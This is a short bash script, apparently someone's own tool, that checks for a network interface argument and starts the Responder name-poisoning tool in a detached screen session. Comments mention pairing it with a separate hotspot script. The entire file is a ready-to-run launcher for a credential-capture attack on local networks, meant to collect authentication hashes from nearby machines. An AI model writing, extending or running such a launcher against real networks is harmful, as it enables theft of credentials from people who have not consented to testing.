#!/usr/bin/env bash

# Command: sudo responder -I wlan0 -dP -vvv

# I need to combine my hotspot script with this responder command.
# But the hotspot script should be run seperately.

INTERFACE=""

usage() { # Print the usage
  echo "Usage: $0 [ -i INTERFACE TO RUN RESPONDER ON (e.g. wlan0) ]
                  [ -h HELP ]" 1>&2
}

exit_error() { # Function: Exit with error

  usage
  echo "-------------"
  echo "Exiting!"
  exit 1

}

while getopts "i:h" opt
do
        case ${opt} in
        i)
                INTERFACE="${OPTARG}"
                ;;
        h)
                echo "---------------"
                exit_error
                ;;
        esac
done

if [[ -z "$INTERFACE" ]]
then
    echo "[!] Error: Enter in an interface"
    exit_error
fi

# Add a feature where it checks if responder successfully was created in screen.

screen -S responder-ap -d -m responder -I "$INTERFACE" -dP -vvv
exit
